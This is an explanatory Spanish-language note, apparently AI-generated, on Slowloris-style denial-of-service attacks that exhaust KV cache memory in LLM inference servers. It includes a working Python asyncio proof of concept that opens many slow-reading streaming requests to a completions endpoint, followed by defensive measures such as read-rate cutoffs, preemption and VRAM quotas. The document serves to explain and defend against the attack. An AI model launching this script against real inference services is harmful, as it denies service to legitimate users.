---
titulo: "Ataques de denegación de servicio contra la memoria KV Cache en inferencia de LLMs"
createdBy: gemini
model: gemini-flash-latest
createdAt: 2026-10-03 13:40
tags: ["ciberseguridad", "llms", "sistemas-distribuidos", "ataques-defensa"]
---

Tanto en [[El cuello de botella de la inferencia en LLMs y la necesidad de sistemas distrib]] como en [[PagedAttention optimización de memoria antes del escalado distribuido]], el foco habitual se pone en el rendimiento y la optimización de recursos. Sin embargo, la gestión de memoria en modelos autorregresivos abre una superficie de ataque crítica: la denegación de servicio algorítmica (*Algorithmic DoS*) dirigida a asfixiar la VRAM de los aceleradores.

En el [[Mecanismo de autoatención escalada en transformadores]], cada nuevo token generado exige persistir su estado proyectado para calcular los pasos futuros. Si un servidor de inferencia expone una API pública sin un control granular de recursos por conexión, un atacante puede explotar la retención de memoria ejecutando una variante adaptada del clásico ataque *Slowloris*.

El mecanismo del ataque consiste en solicitar ventanas de contexto máximas forzando generación extensa, mientras se lee la respuesta en streaming deliberadamente lento (byte a byte). Dado que el servidor debe retener las páginas de claves y valores en la GPU hasta completar o abortar la solicitud, un número moderado de conexiones concurrentes puede saturar por completo el pool de bloques disponibles:

```python
import asyncio
import aiohttp

# PoC: Slowloris adaptado para asfixiar la KV Cache en servidores LLM
async def slow_stream_worker(session, api_url):
    payload = {
        "prompt": "Genera una disertación extensa sobre la historia de los sistemas operativos...",
        "max_tokens": 4096,
        "stream": True
    }
    async with session.post(f"{api_url}/v1/completions", json=payload) as response:
        # Lectura deliberadamente lenta para obligar a retener la KV Cache en VRAM
        async for chunk in response.content.iter_chunked(16):
            await asyncio.sleep(2.0)

async def launch_starvation_attack(target_url, concurrent_requests=40):
    async with aiohttp.ClientSession() as session:
        tasks = [slow_stream_worker(session, target_url) for _ in range(concurrent_requests)]
        await asyncio.gather(*tasks)
```

Cuando el pool de páginas se agota, el programador de inferencia se ve forzado a pausar peticiones legítimas o entrar en un bucle continuo de intercambio (*swapping*) hacia la RAM del host, degradando la latencia global del clúster.

**Técnicas de defensa:**
1. **Monitoreo de throughput del cliente:** Terminar de inmediato sesiones donde la tasa de lectura caiga por debajo de un umbral mínimo de bytes por segundo.
2. **Desalojo preventivo (*Preemption*) jerárquico:** Si la presión de VRAM supera el 90%, expulsar a disco o RAM secundaria las sesiones con menor tasa de transferencia antes de afectar solicitudes interactivas legítimas.
3. **Cuotas por consumo de VRAM estimada:** Limitar las conexiones concurrentes basándose en los megabytes de KV Cache asignados y no solo en peticiones por minuto.
